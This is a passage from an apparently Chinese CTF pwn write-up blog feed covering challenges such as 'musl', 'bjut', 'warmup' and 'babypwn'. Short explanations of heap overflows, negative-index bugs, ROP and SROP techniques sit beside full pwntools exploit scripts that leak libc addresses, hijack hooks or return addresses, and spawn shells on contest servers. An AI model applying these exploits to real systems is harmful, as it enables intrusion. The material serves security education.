io.sendlineafter(&apos;:&apos;,str(idx))</span><br><span class="line">            io.sendlineafter(&apos;:&apos;,str(size))</span><br><span class="line">            io.sendafter(&apos;:&apos;, content)</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line">        iofile_off = [0x25dd,0xf5eb] #_IO_2_1_stderr_+157</span><br><span class="line">        onegadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]</span><br><span class="line"></span><br><span class="line">        # ------------------------------------------------</span><br><span class="line"></span><br><span class="line">        add(0x20,&apos;aaaa&apos;)#0</span><br><span class="line">        add(0x40,&apos;aaaa&apos;)#1</span><br><span class="line">        add(0x60,&apos;aaaa&apos;)#2</span><br><span class="line">        add(0xa0,&apos;aaaa&apos;)#3</span><br><span class="line"></span><br><span class="line">        edit(0,0x40,&apos;a&apos;*0x20+p64(0)+p64(0xc1))</span><br><span class="line">        free(1) #1</span><br><span class="line">        free(1) #2</span><br><span class="line">        add(0x40,&apos;bbbb&apos;) #0</span><br><span class="line">        edit(0,0x60,&apos;a&apos;*0x40+p64(0)+p64(0x71)+p16(iofile_off[0]))</span><br><span class="line">        add(0x60,&apos;aaaa&apos;) # 2</span><br><span class="line">        add(0x60,&apos;aaa&apos;+p64(0)*6+p64(0xfbad1800)+p64(0)*3+&quot;\x00&quot;) #3</span><br><span class="line">        io.recv(0x40)</span><br><span class="line">        leak=u64(io.recv(8))</span><br><span class="line">        info(hex(leak))</span><br><span class="line">        libc.address = leak-(0x7f35bc64a600-0x7f35bc285000)</span><br><span class="line">        log.success(hex(libc.address))</span><br><span class="line">        malloc_hook = libc.sym[&apos;__malloc_hook&apos;]</span><br><span class="line">        free_hook = libc.sym[&apos;__free_hook&apos;]</span><br><span class="line">        one = libc.address+onegadgets[1]</span><br><span class="line">        log.success(hex(malloc_hook))</span><br><span class="line"></span><br><span class="line">        add(0x60,&apos;cccc&apos;)#4</span><br><span class="line">        add(0x60,&apos;dddd&apos;)#5</span><br><span class="line">        free(5)</span><br><span class="line">        edit(0,0x100,0xa0*&apos;\x17&apos;+p64(0)+p64(0x71)+p64(malloc_hook-0x23))</span><br><span class="line">        add(0x60,&apos;bbbb&apos;)</span><br><span class="line">        add(0x60,&apos;d&apos;*0xb+p64(one)+p64(libc.symbols[&quot;realloc&quot;]+13))</span><br><span class="line">        choice(1)</span><br><span class="line">        io.sendlineafter(&apos;:&apos;, str(60))</span><br><span class="line">        io.interactive()</span><br><span class="line">    except Exception as e:</span><br><span class="line">        print(e)</span><br><span class="line">io.close()</span><br><span class="line"></span><br><span class="line">while True:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure></p><h2 id="bjut"><a href="#bjut" class="headerlink" title="bjut"></a>bjut</h2><p>got表可写，pie没开</p><h3 id="漏洞点-2"><a href="#漏洞点-2" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>show 和 edit功能，可以输入负数，造成数组上溢。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">unsigned __int64 edit()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [rsp+4h] [rbp-Ch]</span><br><span class="line">  unsigned __int64 v2; // [rsp+8h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(0x28u);</span><br><span class="line">  puts(&quot;The index of your hw:&quot;);</span><br><span class="line">  __isoc99_scanf(&quot;%d&quot;, &amp;v1);</span><br><span class="line">  if ( v1 &lt;= 15 &amp;&amp; qword_404140[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Input your hw:&quot;);</span><br><span class="line">    read(0, qword_404140[v1], dword_4040E0[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;out of range!&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readfsqword(0x28u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>通过数组上溢泄露free_got内容，然后修改 free_got为system，然后释放/bin/sh的堆块</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><h2 id="musl"><a href="#musl" class="headerlink" title="musl"></a>musl</h2><p>做这个题的时候当时是蒙的，使用的是musl libc跟平时的glibc有很大差异。其中最大的差异是muls不支持延迟绑定，没有 malloc_hook等<br>具体参考 <a href="https://my.oschina.net/u/2306127/blog/1592004" target="_blank" rel="noopener">https://my.oschina.net/u/2306127/blog/1592004</a></p><h3 id="漏洞点-3"><a href="#漏洞点-3" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>add功能有一次堆溢出的机会</p><h3 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h3><p>溢出修改size然后free造成overlapping<br>free时检查了in_use和下一个chunk的prev_size，提前伪造好prev_size<br>overlapping后再取出来，可以uaf，free chunk的链表头部在libc，uaf之后show泄露libc地址，然后edit把fd和bk改为0x602030，利用双向链表写fd bk的操作把一个堆地址写入0x602040，将heap_store劫持到堆上，实现任意地址读写<br>show和edit的次数有限制，但是可以通过任意地址读写覆盖计数器<br>got plt都不可写，没有hook<br>可以通过任意地址读写改写栈，getshell<br>利用任意地址读，读libc中的environ泄露栈地址，算出栈顶地址，然后利用任意地址写覆盖返回地址</p><h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;tmux&apos;, &apos;sp&apos;, &apos;-h&apos;, &apos;-l&apos;, &apos;110&apos;]</span><br><span class="line">if sys.argv[1]==&quot;l&quot;:</span><br><span class="line">r=process([&apos;./libc.so&apos;,&apos;./carbon&apos;])</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line">else:</span><br><span class="line">r=remote(&apos;119.3.158.103&apos;,19008)</span><br><span class="line">libc=ELF(&apos;libc.so&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;wdnmd&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def gg_add(size,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;1&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your prefer size? &gt;&apos;)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(&apos;Are you a believer? &gt;&apos;)</span><br><span class="line">    r.sendline(&apos;Y\x00&apos;)</span><br><span class="line">    r.recvuntil(&apos;Say hello to your new sleeve &gt;&apos;)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def free(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;2&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">def edit(index,data):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;3&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    sleep(0.5)</span><br><span class="line">    r.sendline(data)</span><br><span class="line"></span><br><span class="line">def show(index):</span><br><span class="line">    r.recvuntil(&apos;&gt;&apos;)</span><br><span class="line">    r.sendline(&apos;4&apos;)</span><br><span class="line">    r.recvuntil(&apos;What is your sleeve ID? &gt;&apos;)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line"></span><br><span class="line">heap_store = 0x602030</span><br><span class="line">#add-symbol-file libc.so 0x8000000</span><br><span class="line">#x/64gx 0x82953b0</span><br><span class="line">#x/20gx 0x00007fffff7e0000</span><br><span class="line">add(0x10,&apos;gg&apos;)#0</span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x50,p64(0)*6+p64(0x81)+p64(0xa1))#2</span><br><span class="line">add(0x40,&apos;gg&apos;)#3</span><br><span class="line">add(0x20,&apos;gg&apos;)#4</span><br><span class="line">add(0x20,p64(0x40)+p64(heap_store))#5</span><br><span class="line"></span><br><span class="line">free(0)</span><br><span class="line"></span><br><span class="line">gg_add(0x10,&apos;a&apos;*0x10+p64(0x21)+p64(0x81))#0</span><br><span class="line">free(1)</span><br><span class="line"></span><br><span class="line">add(0x30,&apos;gg&apos;)#1</span><br><span class="line">add(0x30,&apos;gg&apos;)#2 6</span><br><span class="line"></span><br><span class="line">free(2)</span><br><span class="line">show(6)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">info(hex(leak))</span><br><span class="line">gdb.attach(r)</span><br><span class="line">pause()</span><br><span class="line">libc_base = leak-0x292ad8</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">system = libc_base+libc.sym[&apos;system&apos;]</span><br><span class="line">edit(6,p64(heap_store)*2)</span><br><span class="line">free(4)</span><br><span class="line"></span><br><span class="line">add(0x30,p64(heap_store))#pwn</span><br><span class="line">environ = libc_base+0x294FD8</span><br><span class="line">log.success(hex(environ))</span><br><span class="line"></span><br><span class="line">add(0x60,p64(0x71)+p64(environ)+p64(0x71)+p64(libc_base+0x8295570-0x8000000))# environ 9 </span><br><span class="line">edit(5,p64(0))</span><br><span class="line">show(9)</span><br><span class="line">leak = u64(r.recvuntil(&apos;Done.&apos;,drop=True).ljust(8,&apos;\x00&apos;))</span><br><span class="line">stack_rsp = leak-0x118</span><br><span class="line">log.success(hex(stack_rsp))</span><br><span class="line">#gg_stack = 0x7ffffffee638</span><br><span class="line">#print(hex(gg_stack-stack_rsp))</span><br><span class="line">gg_stack = 0xa0+stack_rsp</span><br><span class="line">binsh = libc.search(&apos;/bin/sh\x00&apos;).next()+libc_base</span><br><span class="line">edit(10,p64(0x71)+p64(gg_stack)+&apos;/bin/sh&apos;.ljust(8,&apos;\x00&apos;)+p64(0)+p64(0x41)+p64(binsh))</span><br><span class="line">edit(5,p64(0))</span><br><span class="line">#show(12) test libc_addr</span><br><span class="line">pause()</span><br><span class="line">menu = 0x400c2f</span><br><span class="line">flag = libc_base+0x8295580-0x8000000</span><br><span class="line">pop_rdi_ret = libc_base+0x14862</span><br><span class="line">pop_rsi_ret = libc_base+0x1c237</span><br><span class="line">pop_rdx_ret = libc_base+0x1b92</span><br><span class="line"></span><br><span class="line">puts_addr = libc_base+libc.sym[&apos;puts&apos;]</span><br><span class="line">#edit(10,p64(menu)*10)</span><br><span class="line">edit(10,p64(menu)+p64(pop_rdi_ret)+p64(flag)+p64(system)+p64(menu))</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;easyheap&quot;&gt;&lt;a href=&quot;#easyheap&quot; class=&quot;headerlink&quot; title=&quot;easyheap&quot;&gt;&lt;/a&gt;easyheap&lt;/h2&gt;&lt;p&gt;程序没开PIE，got表可写&lt;/p&gt;
&lt;h3 id=&quot;漏洞点&quot;&gt;&lt;a href=&quot;#漏洞点&quot;
      
    
    </summary>
    
      <category term="pwn" scheme="https://nocbtm.github.io/categories/pwn/"/>
    
    
      <category term="pwn" scheme="https://nocbtm.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>V&amp;N招新赛writeup</title>
    <link href="https://nocbtm.github.io/2020/03/02/V&amp;N%E6%8B%9B%E6%96%B0%E8%B5%9Bwriteup/"/>
    <id>https://nocbtm.github.io/2020/03/02/V&amp;N招新赛writeup/</id>
    <published>2020-03-02T08:47:00.000Z</published>
    <updated>2020-04-23T04:00:50.792Z</updated>
    
    <content type="html"><![CDATA[<h1 id="V-amp-N招新赛writeup"><a href="#V-amp-N招新赛writeup" class="headerlink" title="V&amp;N招新赛writeup"></a>V&amp;N招新赛writeup</h1><p>参考链接:<a href="https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/" target="_blank" rel="noopener">https://www.lhyerror404.cn/2020/03/01/vn-%e8%80%83%e6%a0%b8%e8%b5%9b-writeup/</a></p><h2 id="warmup"><a href="#warmup" class="headerlink" title="warmup"></a>warmup</h2><p>题目首先给了puts函数的地址，可得出libc基址，比赛的时候老想着用栈迁移，但stack_addr是随机的，难度比较大。赛后看了小蓝师傅的博客，又学到了新姿势，返回地址覆盖成ret之后，执行两次ret，刚好返回到第一次输入的地方。然后进行ROP，这题用了prtctl函数把execve禁了，可以用open(flag),read(flag,libc_addr+0x3C6500,0x40),write(1,flag,0x40)获取到flag</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>]==<span class="string">"l"</span>:</span><br><span class="line">p=process(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p=remote(<span class="string">'vn.node3.buuoj.cn'</span>,<span class="number">52275</span>)</span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">'./vn_pwn_warmup'</span>)</span><br><span class="line">p.recvuntil(<span class="string">"gift: 0x"</span>)</span><br><span class="line"></span><br><span class="line">puts_addr=int(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">info(hex(puts_addr))</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">libc_addr=puts_addr-libc.sym[<span class="string">'puts'</span>]</span><br><span class="line">info(hex(libc_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.recvuntil(<span class="string">'Input something: '</span>)</span><br><span class="line">pop_rdi=<span class="number">0x21102</span></span><br><span class="line">pop_rsi=<span class="number">0x202e8</span></span><br><span class="line">pop_rax=<span class="number">0x33544</span></span><br><span class="line">pop_rdx=<span class="number">0x1b92</span></span><br><span class="line">syscall_ret=<span class="number">0xbc375</span></span><br><span class="line">ret=<span class="number">0x937</span></span><br><span class="line">payload = p64(libc_addr+pop_rdi)+p64(<span class="number">0</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(libc_addr+<span class="number">0x3C6500</span>)+p64(libc_addr+pop_rsi)+p64(<span class="number">0</span>)+p64(libc_addr+libc.sym[<span class="string">'open'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">3</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'read'</span>])</span><br><span class="line">payload += p64(libc_addr+pop_rdi)+p64(<span class="number">1</span>)+p64(libc_addr+pop_rsi)+p64(libc_addr+<span class="number">0x3C6600</span>)+p64(libc_addr+pop_rdx)+p64(<span class="number">0x40</span>)+p64(libc_addr+libc.sym[<span class="string">'write'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'name?'</span>)</span><br><span class="line">payload=<span class="string">'a'</span>*<span class="number">0x70</span>+p64(<span class="number">0</span>)+p64(libc_addr+ret)</span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.send(<span class="string">'flag\x00\x00\n'</span>)</span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br><span class="line">p.close()</span><br></pre></td></tr></table></figure><h2 id="babypwn"><a href="#babypwn" class="headerlink" title="babypwn"></a>babypwn</h2><p>SROP参考:<a href="https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop" target="_blank" rel="noopener">https://wiki.x10sec.org/pwn/stackoverflow/advanced_rop/#srop</a><br>这道题还是借鉴小蓝师傅的做法<br>程序调用了syscall(15,&amp;buf),当系统调用号为15时，程序会调用_rt_sigreturn并将我们的输入作为frame传入。然后就可以伪造frame，利用SROP执行read，在libc + 0x3C6500的rw-段布置ROP chain，并返回到其位置执行ORW攻击，程序开启了Sandbox不能执行execve<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump ./vn_pwn_babypwn_1 </span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> <span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"> <span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0d</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"> <span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) goto <span class="number">0005</span></span><br><span class="line"> <span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x0a</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x09</span> <span class="number">0x00</span> <span class="number">0x00000009</span>  <span class="keyword">if</span> (A == mmap) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0006</span>: <span class="number">0x15</span> <span class="number">0x08</span> <span class="number">0x00</span> <span class="number">0x0000000a</span>  <span class="keyword">if</span> (A == mprotect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0007</span>: <span class="number">0x15</span> <span class="number">0x07</span> <span class="number">0x00</span> <span class="number">0x00000029</span>  <span class="keyword">if</span> (A == socket) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0008</span>: <span class="number">0x15</span> <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x0000002a</span>  <span class="keyword">if</span> (A == connect) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0009</span>: <span class="number">0x15</span> <span class="number">0x05</span> <span class="number">0x00</span> <span class="number">0x00000031</span>  <span class="keyword">if</span> (A == bind) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0010</span>: <span class="number">0x15</span> <span class="number">0x04</span> <span class="number">0x00</span> <span class="number">0x00000032</span>  <span class="keyword">if</span> (A == listen) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0011</span>: <span class="number">0x15</span> <span class="number">0x03</span> <span class="number">0x00</span> <span class="number">0x00000038</span>  <span class="keyword">if</span> (A == clone) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0012</span>: <span class="number">0x15</span> <span class="number">0x02</span> <span class="number">0x00</span> <span class="number">0x00000039</span>  <span class="keyword">if</span> (A == fork) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0013</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) goto <span class="number">0015</span></span><br><span class="line"> <span class="number">0014</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"> <span class="number">0015</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure></p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level=<span class="string">'debug'</span></span><br><span class="line">context.arch=<span class="string">'amd64'</span></span><br><span class="line"><span class="comment"># context.arch='i386'</span></span><br><span class="line"></span><br><span class="line">vn_pwn_babypwn_1=ELF(<span class="string">'./vn_pwn_babypwn_1'</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">    libc=ELF(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">elif</span> context.arch == <span class="string">'i386'</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib/i386-linux-gnu/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        libc=ELF(<span class="string">"/lib32/libc.so.6"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_sh</span><span class="params">(other_libc = null)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> libc</span><br><span class="line">    <span class="keyword">if</span> args[<span class="string">'REMOTE'</span>]:</span><br><span class="line">        <span class="keyword">if</span> other_libc <span class="keyword">is</span> <span class="keyword">not</span> null:</span><br><span class="line">            libc = ELF(<span class="string">"./"</span>, checksec = <span class="keyword">False</span>)</span><br><span class="line">        <span class="keyword">return</span> remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(<span class="string">"./vn_pwn_babypwn_1"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_address</span><span class="params">(sh,info=null,start_string=null,end_string=null,offset=null,int_mode=False)</span>:</span></span><br><span class="line">    sh.recvuntil(start_string)</span><br><span class="line">    <span class="keyword">if</span> int_mode :</span><br><span class="line">        return_address=int(sh.recvuntil(end_string).strip(end_string),<span class="number">16</span>)</span><br><span class="line">    <span class="keyword">elif</span> context.arch == <span class="string">'amd64'</span>:</span><br><span class="line">        return_address=u64(sh.recvuntil(end_string).strip(end_string).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">    <span 